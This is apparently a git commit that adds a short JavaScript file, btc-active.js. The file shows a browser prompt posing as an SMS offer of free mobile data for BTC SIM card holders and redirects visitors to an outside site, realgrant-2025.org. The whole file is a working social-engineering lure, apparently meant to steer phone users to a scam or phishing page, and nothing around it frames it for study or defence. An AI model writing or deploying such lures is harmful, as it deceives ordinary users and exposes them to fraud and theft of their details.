a0a2227f55810a0b853c0052de4abb874ca466dc
Sweetblogboi <nsiboy760@gmail.com>
2025-02-26 10:37:26 +0100

    Create btc-active.js

---
+++ btc-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE FREE DATA'
+password=prompt('SMS! Get FREE DATA if your BTC Sim Card is up to 6 months or above, Kindly Press OK to CHECK now   ','ACTIVATE FREE DATA');
+if (password != 'ACTIVATE FREE DATA') {
+location.href='https://realgrant-2025.org/btcbahamas.html';
+}
